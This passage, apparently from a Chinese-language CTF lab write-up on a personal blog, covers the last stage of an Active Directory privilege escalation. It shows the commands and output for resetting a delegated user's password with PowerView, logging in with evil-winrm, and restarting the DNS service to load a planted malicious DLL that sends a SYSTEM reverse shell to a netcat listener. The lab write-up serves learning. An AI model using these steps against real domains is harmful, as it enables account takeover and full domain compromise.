+<p>要利用这一特定的委派权限，必须使用能够调用相应 ADSI 接口的工具。PowerView 的 <code class="notranslate">Set-DomainUserPassword</code> 函数正是为此设计的。</p>
+<ul>
+<li><strong>处理 <code class="notranslate">SecureString</code></strong><br>
+<strong>技术背景</strong>：为安全起见，现代 PowerShell cmdlet 通常要求密码参数为 <code class="notranslate">SecureString</code> 类型，这是一种在内存中加密存储的字符串对象。我们需要先将明文密码进行转换。
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-smi">$SecurePassword</span> <span class="pl-k">=</span> <span class="pl-c1">ConvertTo-SecureString</span> <span class="pl-s"><span class="pl-pds">'</span>P@ssword123!<span class="pl-pds">'</span></span> <span class="pl-k">-</span>AsPlainText <span class="pl-k">-</span>Force</pre></div>
+</li>
+<li><strong>重置密码</strong><br>
+现在，我们可以调用函数，并传入转换后的 <code class="notranslate">SecureString</code> 对象。
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-c1">Set-DomainUserPassword</span> <span class="pl-k">-</span>Identity jianyin <span class="pl-k">-</span>AccountPassword <span class="pl-smi">$SecurePassword</span> <span class="pl-k">-</span>Verbose
+Verbose: [<span class="pl-k">Set</span><span class="pl-k">-</span><span class="pl-k">DomainUserPassword</span>] Attempting to set the password <span class="pl-k">for</span> user <span class="pl-s"><span class="pl-pds">'</span>jianyin<span class="pl-pds">'</span></span>
+Verbose: [<span class="pl-k">Set</span><span class="pl-k">-</span><span class="pl-k">DomainUserPassword</span>] Password <span class="pl-k">for</span> user <span class="pl-s"><span class="pl-pds">'</span>jianyin<span class="pl-pds">'</span></span> successfully reset</pre></div>
+命令成功执行，我们已完全控制 <code class="notranslate">jianyin</code> 账户。</li>
+</ul>
+<h3>4.4. 触发漏洞，获取 SYSTEM 权限</h3>
+<p>至此，所有拼图都已集齐：<code class="notranslate">tindalos</code> 放置了后门，<code class="notranslate">lihua</code> 帮助我们控制了 <code class="notranslate">jianyin</code>，而 <code class="notranslate">jianyin</code> 正是那个拥有“引爆”权限的人。</p>
+<ul>
+<li><strong>使用新凭据登录</strong><br>
+我们现在以 <code class="notranslate">jianyin</code> 的身份登录，他的密码已被我们重置为 <code class="notranslate">P@ssword123!</code>。
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ evil-winrm -i 192.168.205.149 -u <span class="pl-s"><span class="pl-pds">'</span>jianyin<span class="pl-pds">'</span></span> -p <span class="pl-s"><span class="pl-pds">'</span>P@ssword123!<span class="pl-pds">'</span></span>
+...
+<span class="pl-k">*</span>Evil-WinRM<span class="pl-k">*</span> PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\j</span>ianyin<span class="pl-cce">\D</span>ocuments<span class="pl-k">&gt;</span> whoami
+bicker<span class="pl-cce">\j</span>ianyin</pre></div>
+</li>
+<li><strong>准备监听并重启服务</strong><br>
+在 Kali 上开启 Netcat 监听，准备接收反弹 Shell。然后在 <code class="notranslate">jianyin</code> 的会话中，执行重启 DNS 服务的命令。
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在 Kali 终端</span>
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888
+listening on [any] 8888 ...</pre></div>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在 jianyin 的 evil-winrm shell 中</span>
+<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\jianyin\Documents<span class="pl-k">&gt;</span> <span class="pl-c1">Restart-Service</span> DNS</pre></div>
+</li>
+<li><strong>接收 Shell，提权成功</strong><br>
+DNS 服务重启时，加载了我们预先设置的恶意 DLL。Kali 的监听窗口成功接收到连接，我们获得了一个 <code class="notranslate">NT AUTHORITY\SYSTEM</code> 权限的 shell。
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 58463
+Microsoft Windows [�汾 10.0.20348.169]
+(c) Microsoft Corporation����������Ȩ����
+
+C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem<span class="pl-k">32&gt;</span>whoami
+nt authority<span class="pl-cce">\s</span>ystem</pre></div>
+</li>
+</ul>
+<h1><strong>四、夺取凭证</strong></h1>
+<p>获得域控的最高权限后，我们直接进入管理员桌面，查找并读取最终的 flag。</p>
+<pre class="notranslate"><code class="notranslate">C:\Windows\system32&gt;cd C:\Users\Administrator\Desktop\
+
+C:\Users\Administrator\Desktop&gt;dir
+ ������ C �еľ�û�б�ǩ��
+ �������к��� D05C-A317
+
+ C:\Users\Administrator\Desktop ��Ŀ¼
+
+2025/08/15  18:36    &lt;DIR&gt;          .
+2025/08/15  16:59    &lt;DIR&gt;          ..
+2025/08/15  17:06             2,288 Microsoft Edge.lnk
+2025/08/15  18:37                54 root.txt
+               2 ���ļ�          2,342 �ֽ�
+               2 ��Ŀ¼ 38,144,806,912 �����ֽ�
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+root{7c1e4b8a2d6f3b9c5e0a}
+</code></pre>
+<p>成功获取 root flag，本次渗透测试圆满结束。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
